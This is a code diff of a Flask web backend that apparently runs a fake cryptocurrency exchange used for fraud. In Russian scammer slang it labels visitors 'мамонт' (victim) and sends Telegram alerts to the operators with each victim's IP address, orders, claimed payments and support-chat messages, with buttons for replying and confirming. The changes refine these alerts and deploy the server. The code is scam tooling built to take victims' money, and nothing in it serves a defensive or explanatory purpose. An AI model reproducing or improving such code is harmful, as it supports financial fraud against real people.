@@ -42,6 +42,12 @@ def send_message():
     socketio.emit(f'redirect_user_{transID}')
     return {'status': 'message sent'}
 
+#@app.route('/send-error', methods=['POST'])
+#def send_error():
+#    transID = request.json.get('transID')
+#    socketio.emit(f'err_redirect_user_{transID}')
+#    return {'status': 'error sent'}
+
 @app.route('/static/<svgFile>')
 def serve_content(svgFile):
     return send_file(f'static/{svgFile}', mimetype='image/svg+xml')
@@ -81,10 +87,10 @@ def show_index1():
 def getUser(id):
     user_ip = request.remote_addr
     online = 'true'
-    telegram_message = f'мамонт перешел на сайт \n IP:[{user_ip}]'
+    telegram_message = f' 🦣 Мамонт перешел на сайт \n 🌐 IP: {user_ip}'
     inline_keyboard = {
         'inline_keyboard': [
-            #[{'text': 'Ответить', 'callback_data': f'uans_{id}'}],
+            [{'text': 'Ответить', 'callback_data': f'uans_{id}'}],
             #[{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
             #[{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
         ]
@@ -124,7 +130,7 @@ def orderupd(orderId):
 def confirm(orderId):
     db_api.changeStatus(orderId)
     receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status,wallet = db_api.getOrderInfo(orderId)
-    telegram_message = f'[{orderId}]\n Мамонт обозначил заявку как оплаченную\n\n{sendAmount} {sendCurrency} -> {round(float(receiveAmount),6)} {receiveCurrency}\n{email}\n{status}\n Ожидает перевода на: {receiver}'
+    telegram_message = f'{orderId}\n💸 Мамонт обозначил заявку как оплаченную\n\n{sendAmount} {sendCurrency} -> {round(float(receiveAmount),6)} {receiveCurrency}\n{email}\n{status}\n Ожидает перевода на: {receiver}'
     inline_keyboard = {
         'inline_keyboard': [
             [{'text': 'Подтвердить', 'callback_data': f'confirm_{orderId}'}],
@@ -149,12 +155,15 @@ def confirm(orderId):
 @app.route('/confirm/<orderId>/passed',methods = ['POST'])
 def passOrder(orderId):
     db_api.changeStatusToReturned(orderId)
+    telegram_message = f'Заявка мамонта помечена как успешная {orderId}'
+    inline_keyboard = {}
+    send_telegram_message(telegram_message, inline_keyboard)
     return jsonify(status = 'passed')
 
 @app.route('/msgSave/<text>/<userId>/<timestamp>/<user>',methods = ['POST'])
 def msgSave(text,userId,timestamp,user):
     # Пример использования функции send_telegram_message
-    telegram_message = f'Сообщение в ТП от пользователя {userId}\n\n{text}'
+    telegram_message = f'💬 Сообщение в ТП от пользователя {userId}\n\n{text}'
     inline_keyboard = {
         'inline_keyboard': [
             [{'text': 'Ответить', 'callback_data': f'uans_{userId}'}],
@@ -225,7 +234,7 @@ def newOrder(receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,emai
         receiveAmount = format(receiveAmount, 'f') 
     telegram_api_url = tgbotUrl
     payload = {
-        'text': f'[{referalCode}]\n<b>Мамонт создал заявку</b>\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}</b>',
+        'text': f'<b>🤑 Мамонт создал заявку</b>\nРефка: {referalCode}\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}</b>',
         'parse_mode': 'HTML',
         }
     headers = {
@@ -255,7 +264,7 @@ def address_generator(size=6, chars=string.ascii_uppercase + string.digits):
 
 
 if __name__ == '__main__':
-    socketio.run(app, host="0.0.0.0", port=60, debug=True)
+    #socketio.run(app, host="0.0.0.0", port=56742, debug=True)
     #app.run(host="0.0.0.0", port=8000, debug=True)
-    #from waitress import serve
-    #serve(app, host="0.0.0.0", port=8080)
+    from waitress import serve
+    serve(app, host="10.163.108.1", port=8080)
